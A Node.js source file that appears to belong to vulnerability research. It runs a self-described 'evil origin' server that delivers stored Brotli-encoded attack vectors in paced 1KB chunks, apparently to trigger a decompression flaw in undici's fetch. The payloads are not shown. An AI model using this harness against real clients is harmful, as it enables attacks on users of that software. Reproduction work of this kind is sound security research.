// brot-glm2 step 4 — EVIL-ORIGIN (ours): serves OUR corpus vectors as
// Content-Encoding: br responses with CHUNKED small-write delivery to match
// a real external HTTP origin's socket timing (the last delta from the
// Imperva setup: their fetch() victim pulled from a real external server,
// not localhost one-shot). 1KB writes, socket cork, 1ms pacing between
// batches -> many small TCP segments -> undici decompresses per network
// chunk. GET /vec/<name>?dir=constructs|seeds ; also logs accept-encoding
// of every request (verify fetch advertises br — never assume).
const http = require('http');
const fs = require('fs');

const DIRS = { constructs: '/corpus/constructs', seeds: '/corpus/seeds' };

http.createServer((req, res) => {
  const u = new URL(req.url, 'http://evil');
  if (u.pathname === '/health') { res.writeHead(200); return res.end(JSON.stringify({ pid: process.pid, v: process.version })); }
  const m = u.pathname.match(/^\/vec\/([^/]+)$/);
  if (!m) { res.writeHead(404); return res.end('nope'); }
  console.log('REQ accept-encoding:', req.headers['accept-encoding'] || '(none)', 'ua:', (req.headers['user-agent'] || '').slice(0, 40));
  const dir = DIRS[u.searchParams.get('dir') || 'constructs'] || DIRS.constructs;
  let data;
  try { data = fs.readFileSync(dir + '/' + m[1]); } catch { res.writeHead(404); return res.end('nofile'); }
  res.writeHead(200, {
    'Content-Type': 'application/octet-stream',
    'Content-Encoding': 'br',
    'Transfer-Encoding': 'chunked',
    'Cache-Control': 'no-store'
  });
  const CH = 1024;               // small writes (orchestrator-mandated 1KB)
  const BATCH = 64 * 1024;       // cork window
  const sock = res.socket;
  let i = 0;
  (function pump() {
    if (i >= data.length) return res.end();
    sock.cork();
    let sent = 0;
    while (i < data.length && sent < BATCH) {
      const piece = data.slice(i, Math.min(i + CH, data.length));
      res.write(piece);
      i += piece.length; sent += piece.length;
    }
    sock.uncork();
    setTimeout(pump, 1);         // pace: give kernel time to emit segments
  })();
}).listen(8121, '0.0.0.0', () => console.log('evil origin up', process.version));
